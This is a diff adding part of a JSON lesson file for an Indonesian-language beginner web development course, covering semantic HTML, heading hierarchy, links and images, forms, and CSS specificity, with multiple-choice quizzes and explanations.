+            "question": "Apa keuntungan utama menggunakan elemen semantik (<header>, <main>, <article>, <footer>) dibandingkan menggunakan <div> untuk semua bagian?",
+            "options": [
+              "Meningkatkan skor SEO Google dan mempermudah Screen Reader bagi pengguna disabilitas memahami konteks struktur halaman.",
+              "Membuat ukuran file HTML menjadi 10 kali lebih kecil secara otomatis.",
+              "Menghilangkan kebutuhan menulis kode CSS sama sekali.",
+              "Meningkatkan kecepatan koneksi internet pengguna secara otomatis."
+            ],
+            "correctIndex": 0,
+            "explanation": "Elemen semantik memberikan makna struktural bagi mesin pencari, web scraper, dan teknologi asistif pembaca layar (screen reader)."
+          },
+          {
+            "id": "q-2-3-3",
+            "question": "Berapa jumlah elemen <main> yang diperbolehkan untuk konten utama unik dalam satu dokumen halaman HTML?",
+            "options": [
+              "Tepat 1 elemen <main> per dokumen halaman.",
+              "Bebas sebanyak apapun tanpa batasan jumlah.",
+              "Minimal harus ada 5 elemen <main>.",
+              "Hanya boleh diletakkan di dalam elemen <footer>."
+            ],
+            "correctIndex": 0,
+            "explanation": "Elemen <main> merepresentasikan konten unik primer dari sebuah halaman web dan hanya boleh ada satu per dokumen."
+          },
+          {
+            "id": "q-2-3-4",
+            "question": "Tag semantik manakah yang paling tepat digunakan untuk membungkus satu postingan artikel blog mandiri yang utuh?",
+            "options": [
+              "<article>",
+              "<aside>",
+              "<span>",
+              "<head>"
+            ],
+            "correctIndex": 0,
+            "explanation": "<article> digunakan untuk membungkus komposisi konten mandiri yang dapat didistribusikan secara terpisah (seperti postingan artikel atau berita)."
+          }
+        ]
+      },
+      {
+        "id": "lesson-2-4",
+        "stageId": "stage-2",
+        "slug": "teks-judul-dan-hierarki-konten",
+        "title": "Teks, Judul & Hierarki Konten (h1-h6, p, blockquote)",
+        "titleEn": "Text, Headings & Content Hierarchy",
+        "level": "BEGINNER",
+        "estimatedMinutes": 12,
+        "description": "Mengatur hierarki judul bertingkat dari h1 hingga h6, paragraf teks <p>, pemformatan teks, dan kutipan <blockquote>.",
+        "prerequisites": [
+          "elemen-semantik-modern"
+        ],
+        "learningObjectives": [
+          "Menyusun hierarki heading bertingkat (h1 sampai h6) secara logis tanpa melompati tingkatan.",
+          "Menerapkan prinsip satu h1 per halaman untuk optimasi SEO.",
+          "Memformat teks menggunakan elemen semantik (<strong>, <em>, <blockquote>, <code>)."
+        ],
+        "whyMatters": "Struktur heading yang rapi memungkinkan pengguna melakukan pemindaian cepat (skimming) dan membantu bot mesin pencari memahami topik bahasan artikel.",
+        "careerContext": "Audit aksesibilitas WCAG selalu memeriksa kelurusan pohon heading untuk memastikan dokumen ramah pembaca layar.",
+        "commonMistakes": [
+          "Memilih tag heading hanya berdasarkan ukuran besar-kecilnya font visual (gunakan CSS untuk mengatur ukuran font, gunakan heading untuk struktur logis).",
+          "Melompat tingkat heading, misalnya dari `<h1>` langsung meloncat ke `<h4>` tanpa `<h2>` dan `<h3>`."
+        ],
+        "keyTerms": [
+          {
+            "term": "<h1> sampai <h6>",
+            "definition": "Tingkatan judul dokumen dari level 1 (terpenting) hingga level 6 (sub-bagian terdalam)."
+          },
+          {
+            "term": "<p>",
+            "definition": "Elemen paragraf teks blok standar."
+          },
+          {
+            "term": "<blockquote>",
+            "definition": "Elemen blok kutipan yang bersumber dari tokoh, buku, atau referensi luar."
+          },
+          {
+            "term": "<strong> vs <em>",
+            "definition": "<strong> untuk teks penting/mendesak (tebal), <em> untuk teks dengan penekanan makna (miring)."
+          }
+        ],
+        "contentMd": "# Teks, Judul & Hierarki Konten (h1-h6, p, blockquote)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara menyusun hierarki konten teks yang terstruktur menggunakan tingkat judul **`<h1>` sampai `<h6>`**, paragraf **`<p>`**, format penekanan **`<strong>`** dan **`<em>`**, serta kutipan **`<blockquote>`**.\n\n## Mengapa Konsep Ini Penting?\nPengunjung web jarang membaca setiap kata dari atas ke bawah; mereka melakukan *skimming* (pemindaian cepat) dengan membaca judul-judul utama. Mesin pencari seperti Google juga menggunakan pohon heading untuk menentukan topik bahasan artikel Anda.\n\n## Aturan Hierarki Heading (h1 hingga h6)\nHTML menyediakan 6 tingkat heading:\n- **`<h1>`**: Judul Utama Topik Halaman (**Aturan Emas: Gunakan Tepat 1 per Halaman**).\n- **`<h2>`**: Sub-bab atau Bagian Utama Topik.\n- **`<h3>`**: Sub-bagian di dalam `<h2>`.\n- **`<h4>` s/d `<h6>`**: Rincian sub-bagian yang lebih dalam.\n\n### Contoh Pohon Hierarki yang BENAR:\n```html\n<h1>Panduan Belajar Frontend Web</h1>\n\n  <h2>1. Fondasi HTML5</h2>\n    <h3>1.1 Anatomi Tag</h3>\n    <h3>1.2 Kerangka Dokumen</h3>\n\n  <h2>2. Desain dengan CSS</h2>\n    <h3>2.1 Box Model</h3>\n    <h3>2.2 Flexbox Layout</h3>\n```\n\n> **Peringatan Penting**: Jangan pernah melompat tingkat heading (misal dari `<h1>` langsung melompat ke `<h4>`). Jika Anda menginginkan teks judul yang berukuran kecil, ubah ukuran font-nya menggunakan CSS (`font-size`), bukan dengan memilih tag heading yang salah tingkatannya!\n\n## Pemformatan Teks Semantik\n- **`<strong>`**: Menandai teks yang memiliki tingkat kepentingan tinggi (ditampilkan tebal secara default dan dibaca dengan nada tegas oleh screen reader).\n- **`<em>`**: Menandai teks yang memiliki penekanan intonasi (*emphasis*) (ditampilkan miring secara default).\n- **`<blockquote>`**: Menampilkan blok kutipan panjang dari sumber eksternal. Dapat dilengkapi atribut `cite`.\n- **`<code>`**: Menandai cuplikan kode pemrograman di dalam teks.\n\n```html\n<p>\n  Bahasa <strong>HTML</strong> adalah bahasa markah, \n  <em>bukan</em> bahasa pemrograman komputasi.\n</p>\n\n<blockquote cite=\"https://w3c.org\">\n  \"Aksesibilitas web adalah hak mendasar bagi setiap individu untuk mengakses informasi.\"\n</blockquote>\n```\n\n## Kesalahan Umum Pemula\n- **Memakai tag `<h1>` lebih dari satu**: Menaruh 5 buah tag `<h1>` di satu halaman yang membingungkan algoritma mesin pencari mengenai topik utama artikel.\n- **Menggunakan tag `<b>` dan `<i>` jadul**: Tag `<b>` dan `<i>` hanya bersifat visual murni tanpa makna semantik, gunakan `<strong>` dan `<em>` yang ramah aksesibilitas.\n\n## Praktik Mandiri\n1. Buat sebuah artikel pendek yang memiliki 1 buah `<h1>`, 2 buah `<h2>`, masing-masing memiliki satu `<h3>`, dan sisipkan satu blok `<blockquote>`.\n2. Pastikan urutan heading tidak ada yang melompat tingkat.\n\n## Ringkasan\n- Satu halaman idealnya hanya memiliki **satu `<h1>`** sebagai judul utama.\n- Jangan melompat tingkat heading (gunakan urutan logis h1 $\\rightarrow$ h2 $\\rightarrow$ h3).\n- Gunakan tag heading untuk struktur makna, dan gunakan CSS untuk ukuran visual font.\n- Gunakan **`<strong>`** dan **`<em>`** untuk penekanan makna teks secara semantik.",
+        "quizzes": [
+          {
+            "id": "q-2-4-1",
+            "question": "Berdasarkan standar SEO dan aksesibilitas dokumen, berapa banyak tag <h1> yang idealnya digunakan dalam satu halaman web?",
+            "options": [
+              "Tepat 1 tag <h1> sebagai topik/judul utama halaman.",
+              "Minimal 10 tag <h1> agar nilai SEO maksimal.",
+              "Tidak boleh menggunakan <h1> sama sekali.",
+              "Bebas digunakan di setiap baris paragraf teks."
+            ],
+            "correctIndex": 0,
+            "explanation": "Satu halaman idealnya hanya memiliki satu <h1> sebagai representasi topik utama dokumen, diikuti <h2> dan <h3> sebagai sub-topik terstruktur."
+          },
+          {
+            "id": "q-2-4-2",
+            "question": "Manakah contoh hierarki heading yang SALAH dan melanggar prinsip struktur konten?",
+            "options": [
+              "Melompat langsung dari level <h1> ke level <h4> tanpa ada <h2> atau <h3> di antaranya.",
+              "Menggunakan <h1> untuk judul artikel dan <h2> untuk sub-bab pembahasan.",
+              "Menggunakan <h3> di dalam bagian yang berada di bawah <h2>.",
+              "Menempatkan paragraf <p> di bawah elemen <h2>."
+            ],
+            "correctIndex": 0,
+            "explanation": "Melompat tingkat heading (misal dari h1 langsung ke h4) merusak pohon hierarki dokumen dan membingungkan pengguna teknologi screen reader."
+          },
+          {
+            "id": "q-2-4-3",
+            "question": "Jika Anda ingin membuat teks judul terlihat berukuran lebih kecil, cara manakah yang paling tepat menurut best practice?",
+            "options": [
+              "Tetap gunakan tingkat tag heading yang benar secara logis (misal <h2>) lalu atur ukuran visualnya menggunakan properti CSS font-size.",
+              "Mengganti tag <h2> menjadi <h6> secara sembarangan hanya agar teksnya mengecil.",
+              "Menghapus tag heading dan menggantinya dengan tag <b>.",
+              "Mengubah file HTML menjadi gambar JPG."
+            ],
+            "correctIndex": 0,
+            "explanation": "Tag heading digunakan untuk struktur logis dokumen, sedangkan estetika ukuran font selalu dikendalikan melalui stylesheet CSS."
+          }
+        ]
+      },
+      {
+        "id": "lesson-2-5",
+        "stageId": "stage-2",
+        "slug": "tautan-gambar-dan-media-konten",
+        "title": "Tautan (a) & Media Gambar (img, alt)",
+        "titleEn": "Hyperlinks & Image Media",
+        "level": "BEGINNER",
+        "estimatedMinutes": 12,
+        "description": "Membuat tautan internal dan eksternal dengan <a>, atribut target dan rel, serta menampilkan gambar responsif dan aksesibel dengan <img> dan atribut alt.",
+        "prerequisites": [
+          "teks-judul-dan-hierarki-konten"
+        ],
+        "learningObjectives": [
+          "Membuat hyperlink menggunakan tag <a> dengan atribut href dan anchor internal.",
+          "Menerapkan target=\"_blank\" bersamaan dengan rel=\"noopener noreferrer\" untuk keamanan.",
+          "Menyisipkan media gambar dengan tag <img> serta atribut alt yang deskriptif untuk aksesibilitas."
+        ],
+        "whyMatters": "Tautan adalah jaring laba-laba yang menghubungkan seluruh web (Hypertext), dan gambar tanpa teks alternatif 'alt' merugikan pengguna tunanetra serta merusak skor SEO.",
+        "careerContext": "Audit aksesibilitas website selalu memeriksa apakah seluruh gambar memiliki teks alternatif yang informatif.",
+        "commonMistakes": [
+          "Membuka link di tab baru (`target=\"_blank\"`) tanpa menyertakan `rel=\"noopener noreferrer\"` (celah keamanan tabnabbing).",
+          "Mengosongkan atribut `alt=\"\"` pada gambar informatif atau mengisinya dengan teks tidak berguna seperti `alt=\"foto\"`."
+        ],
+        "keyTerms": [
+          {
+            "term": "<a> (Anchor)",
+            "definition": "Elemen untuk membuat tautan yang dapat diklik menuju halaman, file, atau bagian dokumen lain."
+          },
+          {
+            "term": "href",
+            "definition": "Hypertext Reference: atribut penentu alamat URL tujuan tautan."
+          },
+          {
+            "term": "<img>",
+            "definition": "Elemen void untuk menyematkan gambar ke dokumen web."
+          },
+          {
+            "term": "alt",
+            "definition": "Alternative Text: teks pengganti yang dibacakan screen reader dan tampil jika gambar gagal dimuat."
+          }
+        ],
+        "contentMd": "# Tautan (a) & Media Gambar (img, alt)\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara menghubungkan halaman web menggunakan tautan (**Hyperlink `<a>`**) serta menyisipkan media visual (**Gambar `<img>`**) secara aksesibel dan aman.\n\n## Mengapa Konsep Ini Penting?\nWeb disebut *World Wide Web* karena jutaan dokumen saling terhubung melalui tautan (*hyperlinks*). Selain itu, gambar adalah elemen visual utama yang wajib disajikan dengan teks alternatif agar dapat diakses oleh semua orang, termasuk penyandang disabilitas penglihatan.\n\n## 1. Membuat Tautan Hyperlink dengan `<a>`\nTag `<a>` (*anchor*) menggunakan atribut `href` (*hypertext reference*) untuk menentukan URL tujuan:\n\n```html\n<!-- Tautan Eksternal (Membuka di Tab Baru Secara Aman) -->\n<a \n  href=\"https://google.com\" \n  target=\"_blank\" \n  rel=\"noopener noreferrer\"\n>\n  Kunjungi Google\n</a>\n\n<!-- Tautan Internal Antar Halaman -->\n<a href=\"/tentang-kami\">Halaman Tentang Kami</a>\n\n<!-- Tautan Melompat ke Bagian Internal Dokumen (Anchor Link) -->\n<a href=\"#bagian-kontak\">Langsung ke Kontak</a>\n```\n\n> **Aturan Keamanan Wajib**: Setiap kali menggunakan `target=\"_blank\"` (membuka tab baru), Anda **WAJIB** menyertakan `rel=\"noopener noreferrer\"` untuk mencegah celah keamanan *Reverse Tabnabbing* di mana halaman baru dapat memanipulasi jendela halaman asal Anda.\n\n## 2. Menyisipkan Gambar dengan `<img>`\nTag `<img>` adalah void element yang memerlukan dua atribut utama:\n\n```html\n<img \n  src=\"/images/profil-acelino.webp\" \n  alt=\"Foto profil Acelino, Founder BelajarinAja\" \n  width=\"400\" \n  height=\"400\" \n/>\n```\n\n### Mengapa Atribut `alt` Sangat Krusial?\n1. **Screen Reader (Aksesibilitas)**: Dibacakan dengan suara lantang kepada pengguna tunanetra untuk mendeskripsikan konteks visual gambar.\n2. **Fallback Saat Jaringan Lambat**: Jika gambar gagal diunduh karena gangguan internet, teks `alt` akan tampil di layar menggantikan gambar rusak.\n3. **SEO Google Images**: Membantu mesin pencari mengindeks foto Anda di hasil pencarian gambar.\n\n## Kesalahan Umum Pemula\n- **Mengisi alt dengan teks generik**: Menulis `alt=\"gambar\"` atau `alt=\"foto1.jpg\"` yang sama sekali tidak memberikan konteks informasi bagi pengguna screen reader.\n- **Lupa menyertakan atribut width dan height**: Membuat browser mengalami lonjakan layout mendadak (*Cumulative Layout Shift / CLS*) saat gambar selesai dimuat.\n\n## Praktik Mandiri\n1. Buat sebuah gambar menggunakan tag `<img>` lengkap dengan atribut `src`, `alt` deskriptif, serta nilai `width` dan `height`.\n2. Bungkus gambar tersebut di dalam tag `<a>` agar gambar tersebut dapat diklik dan mengarahkan ke halaman profil Anda.\n\n## Ringkasan\n- Tag **`<a>`** membuat hyperlink menggunakan atribut **`href`**.\n- Tautan tab baru (`target=\"_blank\"`) wajib disertai **`rel=\"noopener noreferrer\"`**.\n- Tag **`<img>`** wajib memiliki atribut **`alt`** yang mendeskripsikan isi gambar secara informatif untuk aksesibilitas dan SEO.",
+        "quizzes": [
+          {
+            "id": "q-2-5-1",
+            "question": "Mengapa atribut alt pada tag <img> merupakan atribut wajib yang sangat krusial?",
+            "options": [
+              "Menyediakan teks alternatif deskriptif bagi pengguna tunanetra melalui screen reader dan tampil saat gambar gagal dimuat.",
+              "Untuk menentukan warna garis border gambar secara otomatis.",
+              "Untuk mempercepat loading file video di browser.",
+              "Sebagai password enkripsi file gambar di server."
+            ],
+            "correctIndex": 0,
+            "explanation": "Atribut alt krusial untuk aksesibilitas (a11y) dan SEO, memberikan deskripsi kontekstual ketika gambar tidak dapat dilihat."
+          },
+          {
+            "id": "q-2-5-2",
+            "question": "Kombinasi atribut manakah yang WAJIB digunakan untuk membuka tautan <a> di tab baru secara aman?",
+            "options": [
+              "target=\"_blank\" rel=\"noopener noreferrer\"",
+              "target=\"_newtab\" secure=\"true\"",
+              "window=\"open-tab\" safe=\"1\"",
+              "href=\"new-tab://belajarinaja.com\""
+            ],
+            "correctIndex": 0,
+            "explanation": "Menggunakan target=\"_blank\" wajib dipadukan dengan rel=\"noopener noreferrer\" untuk mencegah celah keamanan reverse tabnabbing."
+          },
+          {
+            "id": "q-2-5-3",
+            "question": "Bagaimana cara membuat tautan internal yang ketika diklik akan langsung menggulirkan layar ke elemen dengan id=\"kontak\" pada halaman yang sama?",
+            "options": [
+              "<a href=\"#kontak\">Hubungi Kami</a>",
+              "<a target=\"kontak\">Hubungi Kami</a>",
+              "<a link=\"jump-kontak\">Hubungi Kami</a>",
+              "<a href=\"@kontak\">Hubungi Kami</a>"
+            ],
+            "correctIndex": 0,
+            "explanation": "Anchor link internal memanfaatkan simbol pagar #nama-id untuk mengarahkan viewport browser langsung ke elemen yang memiliki atribut id tersebut."
+          }
+        ]
+      },
+      {
+        "id": "lesson-2-6",
+        "stageId": "stage-2",
+        "slug": "formulir-dan-input-user",
+        "title": "Formulir, Input & Validasi Bawaan HTML5",
+        "titleEn": "Forms, Inputs & Native Validation",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Membangun formulir interaktif dengan <form>, menghubungkan <label> dan <input> (for/id), tipe input HTML5, dan atribut validasi (required, pattern, minlength).",
+        "prerequisites": [
+          "tautan-gambar-dan-media-konten"
+        ],
+        "learningObjectives": [
+          "Menyusun elemen formulir menggunakan tag <form>, <label>, dan berbagai tipe <input>.",
+          "Menghubungkan elemen <label> dengan <input> menggunakan pasangan atribut for dan id.",
+          "Menerapkan validasi bawaan browser menggunakan atribut required, type email, minlength, dan pattern."
+        ],
+        "whyMatters": "Formulir adalah pintu gerbang utama interaksi pengguna untuk mengumpulkan data: pendaftaran akun, checkout belanja, dan kotak pencarian.",
+        "careerContext": "Frontend developer wajib menguasai pembuatan form yang aksesibel dan bebas hambatan bagi pengguna.",
+        "commonMistakes": [
+          "Tidak menyertakan `<label>` dan hanya mengandalkan `placeholder` (placeholder akan hilang saat teks diketik sehingga menyulitkan pengguna mengingat nama kolom).",
+          "Lupa menyamakan atribut `for` pada label dengan `id` pada input."
+        ],
+        "keyTerms": [
+          {
+            "term": "<form>",
+            "definition": "Wadah penampung elemen input kontrol untuk pengumpulan data pengguna."
+          },
+          {
+            "term": "<label>",
+            "definition": "Label keterangan teks untuk elemen input yang memicu fokus saat diklik."
+          },
+          {
+            "term": "<input>",
+            "definition": "Elemen kontrol masukan data (type text, email, password, checkbox, radio, dll)."
+          },
+          {
+            "term": "required",
+            "definition": "Atribut boolean yang mencegah form dikirim jika input masih kosong."
+          }
+        ],
+        "contentMd": "# Formulir, Input & Validasi Bawaan HTML5\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari cara membangun formulir pengumpulan data pengguna yang ramah aksesibilitas menggunakan tag **`<form>`**, menghubungkan **`<label>`** dengan **`<input>`**, serta memanfaatkan **validasi bawaan HTML5**.\n\n## Mengapa Konsep Ini Penting?\nFormulir adalah komponen interaksi terpenting di web: mulai dari form pendaftaran akun, pengisian ulasan, hingga formulir transaksi pembayaran. Membuat formulir yang salah akan membingungkan pengguna dan menurunkan angka konversi website.\n\n## 1. Menghubungkan `<label>` dan `<input>` Secara Aksesibel\nStandar emas pembuatan form mewajibkan setiap input memiliki label penjelas. Cara menghubungkannya secara semantik adalah menyamakan nilai **`for`** pada label dengan **`id`** pada input:\n\n```html\n<form action=\"/api/login\" method=\"POST\">\n  <!-- Kolom Email -->\n  <div class=\"form-group\">\n    <label for=\"email-pengguna\">Alamat Email:</label>\n    <input \n      type=\"email\" \n      id=\"email-pengguna\" \n      name=\"email\" \n      required \n      placeholder=\"nama@email.com\" \n    />\n  </div>\n\n  <!-- Kolom Password -->\n  <div class=\"form-group\">\n    <label for=\"kata-sandi\">Kata Sandi:</label>\n    <input \n      type=\"password\" \n      id=\"kata-sandi\" \n      name=\"password\" \n      required \n      minlength=\"8\" \n    />\n  </div>\n\n  <!-- Tombol Kirim -->\n  <button type=\"submit\">Masuk ke Akun</button>\n</form>\n```\n\n### Keuntungan Menghubungkan `for` dan `id`:\n1. **Target Sentuh Lebih Luas**: Ketika pengguna mengklik teks label, kursor keyboard akan otomatis langsung aktif di dalam kotak input (sangat membantu di layar sentuh smartphone).\n2. **Aksesibilitas Screen Reader**: Pembaca layar akan otomatis menyuarakan nama label saat pengguna berpindah antar kolom input dengan tombol Tab.\n\n## 2. Tipe-Tipe Input Populer di HTML5\n- **`type=\"text\"`**: Input teks satu baris umum.\n- **`type=\"email\"`**: Menampilkan keyboard khusus email di HP (dengan tombol `@`) dan memvalidasi format email.\n- **`type=\"password\"`**: Menyembunyikan karakter teks yang diketik menjadi bulatan titik.\n- **`type=\"number\"`**: Khusus input angka dengan tombol panah naik/turun.\n- **`type=\"checkbox\"`**: Pilihan centang kotak (dapat memilih lebih dari satu).\n- **`type=\"radio\"`**: Pilihan lingkaran radio (hanya boleh memilih 1 dalam grup nama yang sama).\n\n## 3. Fitur Validasi Bawaan Browser\nHTML5 menyediakan validasi tanpa perlu menulis skrip JavaScript tambahan:\n- **`required`**: Wajib diisi (form menolak submit jika kosong).\n- **`minlength=\"8\"`**: Panjang karakter minimal.\n- **`min=\"1\" max=\"100\"`**: Batas nilai angka terkecil dan terbesar.\n- **`pattern=\"[0-9]{10,12}\"`**: Validasi format ekspresi reguler (misal: nomor HP).\n\n## Kesalahan Umum Pemula\n- **Mengganti label dengan placeholder**: `placeholder` adalah contoh isian samar, bukan pengganti label. Begitu pengguna mulai mengetik, placeholder akan lenyap.\n- **Membuat tombol submit dengan `<div onClick=...>`**: Elemen `<div>` tidak dapat diakses via navigasi keyboard (tombol Tab dan Enter). Selalu gunakan tag `<button type=\"submit\">`.\n\n## Praktik Mandiri\n1. Buat sebuah formulir pendaftaran yang memiliki kolom: Nama Lengkap (`type=\"text\"`), Email (`type=\"email\"`), Password (`type=\"password\"`, minimal 8 karakter), dan tombol Submit.\n2. Hubungkan setiap `<label for=\"...\">` dengan `<input id=\"...\">` yang sesuai.\n\n## Ringkasan\n- Setiap input wajib memiliki pasangan **`<label for=\"id-input\">`** yang terhubung dengan **`<input id=\"id-input\">`**.\n- Gunakan tipe input yang sesuai (**`email`**, **`password`**, **`number`**) untuk mengaktifkan keyboard optimal di perangkat mobile.\n- Manfaatkan atribut validasi bawaan seperti **`required`** dan **`minlength`**.\n- Selalu gunakan tag **`<button type=\"submit\">`** untuk mengirimkan formulir secara aksesibel.",
+        "quizzes": [
+          {
+            "id": "q-2-6-1",
+            "question": "Bagaimana cara menghubungkan elemen <label> dengan elemen <input> secara semantik dan aksesibel?",
+            "options": [
+              "Menyamakan nilai atribut for pada label dengan atribut id pada input (contoh: <label for=\"email\"> dan <input id=\"email\">).",
+              "Menyamakan atribut class pada label dan input.",
+              "Meletakkan label dan input di dalam tag <div> yang sama tanpa atribut apapun.",
+              "Menggunakan nama file CSS yang sama untuk label dan input."
+            ],
+            "correctIndex": 0,
+            "explanation": "Atribut for pada label yang bernilai sama dengan id pada input memungkinkan pengguna mengklik teks label untuk langsung memfokuskan kursor ke input terkait."
+          },
+          {
+            "id": "q-2-6-2",
+            "question": "Manakah tipe input yang paling tepat digunakan untuk mengumpulkan alamat surat elektronik pengguna dengan validasi format bawaan browser?",
+            "options": [
+              "type=\"email\"",
+              "type=\"text\"",
+              "type=\"mail\"",
+              "type=\"address\""
+            ],
+            "correctIndex": 0,
+            "explanation": "type=\"email\" memicu keyboard khusus email pada perangkat mobile dan memvalidasi keberadaan simbol @ serta domain sebelum submit."
+          },
+          {
+            "id": "q-2-6-3",
+            "question": "Apa fungsi dari atribut boolean required pada elemen <input> HTML5?",
+            "options": [
+              "Mencegah formulir dikirimkan (submit) jika input tersebut masih kosong tanpa perlu menulis kode JavaScript tambahan.",
+              "Mengubah warna teks input menjadi merah secara permanen.",
+              "Menyembunyikan input dari layar pengguna.",
+              "Mengunci input agar tidak bisa diubah setelah diketik."
+            ],
+            "correctIndex": 0,
+            "explanation": "Atribut required memberikan validasi Client-Side bawaan dari browser sebelum form diizinkan memicu aksi pengiriman data."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "stage-3",
+    "orderIndex": 3,
+    "titleId": "Modern CSS & Box Model Fundamentals",
+    "titleEn": "Modern CSS & Box Model Fundamentals",
+    "category": "Fundamentals",
+    "description": "Menguasai sintaks CSS, spesifisitas selektor, hierarki box model, tipografi, warna, sistem positioning, dan transisi animasi.",
+    "descriptionEn": "Master CSS syntax, selector specificity, box model hierarchy, typography, colors, positioning systems, and animations.",
+    "lessons": [
+      {
+        "id": "lesson-3-1",
+        "stageId": "stage-3",
+        "slug": "sintaks-css-selektor-dan-spesifisitas",
+        "title": "Sintaks CSS, Selektor & Spesifisitas",
+        "titleEn": "CSS Syntax, Selectors & Specificity",
+        "level": "BEGINNER",
+        "estimatedMinutes": 15,
+        "description": "Menulis aturan CSS (selector, property, value), hirarki spesifisitas (ID vs Class vs Tag), dan aturan cascading.",
+        "prerequisites": [
+          "formulir-dan-input-user"
+        ],
+        "learningObjectives": [
+          "Menjelaskan anatomi aturan CSS: selector, declaration block, property, dan value.",
+          "Menghitung dan membandingkan bobot spesifisitas selektor (Inline > ID > Class > Tag).",
+          "Menjelaskan aturan Cascading ketika terjadi konflik gaya.",
+          "Menghindari penggunaan !important yang berlebihan."
+        ],
+        "whyMatters": "Memahami spesifisitas mencegah frustrasi saat gaya CSS yang Anda tulis tidak kunjung diterapkan pada elemen akibat kalah bobot selektor.",
+        "careerContext": "Arsitektur CSS profesional menjaga spesifisitas tetap rendah dan datar agar komponen mudah di-override secara teratur.",
+        "commonMistakes": [
+          "Menggunakan `!important` sebagai jalan pintas mengatasi konflik spesifisitas (menciptakan utang teknis yang sulit diperbaiki).",
+          "Terlalu sering menggunakan ID Selector untuk styling komponen yang seharusnya reusable."
+        ],
+        "keyTerms": [
+          {
+            "term": "CSS Rule",
+            "definition": "Blok aturan gaya yang terdiri dari selektor target dan deklarasi properti-nilai."
+          },
+          {
+            "term": "Specificity",
+            "definition": "Sistem pembobotan yang digunakan browser untuk menentukan aturan CSS mana yang menang jika terjadi konflik selektor."
+          },
+          {
+            "term": "Cascade",
+            "definition": "Prinsip air terjun di mana aturan yang ditulis paling akhir dengan bobot setara akan menimpa aturan sebelumnya."
+          },
+          {
+            "term": "!important",
+            "definition": "Deklarasi paksa yang mengabaikan urutan spesifisitas standar."
+          }
+        ],
+        "contentMd": "# Sintaks CSS, Selektor & Spesifisitas\n\n## Apa yang Akan Dipelajari?\nPada materi ini, Anda akan mempelajari anatomi penulisan aturan **CSS (Cascading Style Sheets)**, jenis-jenis **selektor**, bagaimana browser menghitung **bobot spesifisitas (*Specificity*)**, dan cara kerja prinsip **Cascading**.\n\n## Mengapa Konsep Ini Penting?\nPernahkah Anda menulis aturan CSS baru, tetapi tampilannya di browser sama sekali tidak berubah? Masalah paling umum yang dialami developer pemula bukanlah salah menulis nama warna, melainkan kalah dalam pertarungan bobot spesifisitas selektor.\n\n## 1. Anatomi Aturan CSS\nSetiap aturan CSS terdiri dari elemen-elemen berikut:\n\n```css\n/* Selektor -> Target Elemen */\n.kartu-produk {\n  /* Deklarasi: Properti : Nilai; */\n  background-color: #ffffff;\n  padding: 16px;\n  border-radius: 8px;\n}\n```\n\n- **Selector (`.kartu-produk`)**: Menentukan elemen HTML mana yang ingin ditata gayanya.\n- **Property (`background-color`)**: Aspek visual yang ingin diubah.\n- **Value (`#ffffff` / putih)**: Nilai baru yang diberikan pada properti.\n\n## 2. Hirarki Bobot Spesifisitas (Specificity Hierarchy)\nJika dua aturan menargetkan elemen yang sama dengan properti yang bertentangan, browser akan memilih aturan dengan **bobot spesifisitas tertinggi**:\n\n| Jenis Selektor | Contoh Sintaks | Nilai Bobot |\n| :--- | :--- | :--- |\n| **Inline Style** | `<p style=\"color: red;\">` | **(1, 0, 0, 0)** |\n| **ID Selector** | `#judul-halaman` | **(0, 1, 0, 0)** |\n| **Class / Attribute / Pseudo-class** | `.tombol-aksi`, `[type=\"text\"]`, `:hover` | **(0, 0, 1, 0)** |\n| **Element / Pseudo-element** | `h1`, `p`, `div`, `::before` | **(0, 0, 0, 1)** |\n| **Universal Selector** | `*` | **(0, 0, 0, 0)** |\n\n### Contoh Kasus Spesifisitas:\n```css\n/* Bobot: (0, 0, 0, 1) -> Tag Element */\np {\n  color: blue;\n}\n\n/* Bobot: (0, 0, 1, 0) -> Class Selector (MENANG!) */\n.teks-merah {\n  color: red;\n}\n```\nJika elemen ditulis: `<p class=\"teks-merah\">Halo Dunia</p>`, teks akan berwarna **MERAH**, karena class selector memiliki bobot lebih tinggi daripada tag element.\n\n## 3. Prinsip Cascading (Urutan Eksekusi)\nJika dua aturan memiliki **bobot spesifisitas yang sama persis**, aturan yang ditulis **paling akhir di stylesheet** yang akan menang (efek air terjun / *cascade*):\n\n```css\n.teks { color: green; }\n.teks { color: orange; } /* Aturan ini yang MENANG karena ditulis belakangan */\n```\n\n## 4. Bahaya Penggunaan `!important`\nMenambahkan `!important` akan memaksa sebuah properti menang secara absolut, mengabaikan spesifisitas normal:\n\n```css\n/* HINDARI PENGGUNAAN BERLEBIHAN */\np {\n  color: yellow !important;\n}\n```\n> **Peringatan**: Penggunaan `!important` merusak alur alami cascading dan membuat kode CSS sangat sulit diubah atau dirawat di kemudian hari (*maintenance nightmare*).\n\n## Kesalahan Umum Pemula\n- **Memakai ID selector untuk styling komponen berulang**: ID hanya boleh ada 1 per halaman, gunakan Class Selector untuk styling komponen agar dapat digunakan kembali.\n- **Lupa tanda titik pada class atau pagar pada ID**: Menulis `tombol` alih-alih `.tombol` akan menargetkan tag `<tombol>` yang tidak ada di HTML.\n\n## Praktik Mandiri\n1. Buat elemen `<h2 id=\"judul-utama\" class=\"teks-biru\">Judul Saya</h2>`.\n2. Tulis aturan CSS untuk tag `h2`, class `.teks-biru`, dan ID `#judul-utama` dengan warna berbeda.\n3. Amati di browser warna mana yang diterapkan dan buktikan kemenangan ID selector.\n\n## Ringkasan\n- Aturan CSS terdiri dari **selektor**, **properti**, dan **nilai**.\n- Bobot spesifisitas: **Inline > ID > Class > Tag Element**.\n- Jika spesifisitas imbang, aturan yang ditulis **paling akhir** yang akan diterapkan.\n- Hindari penggunaan **`!important`** untuk menjaga kode tetap bersih dan mudah di-override.",
+        "quizzes": [
+          {
+            "id": "q-3-1-1",
+            "question": "Berdasarkan hirarki spesifisitas CSS, jenis selektor manakah yang memiliki bobot spesifisitas paling tinggi di antara pilihan berikut?",
+            "options": [
+              "ID Selector (contoh: #header-title)",
+              "Class Selector (contoh: .header-title)",
+              "Tag Element Selector (contoh: h1)",
+              "Universal Selector (contoh: *)"
+            ],
+            "correctIndex": 0,
+            "explanation": "ID Selector memiliki bobot (0,1,0,0) yang jauh lebih tinggi dibandingkan Class Selector (0,0,1,0) maupun Tag Element Selector (0,0,0,1)."
+          },
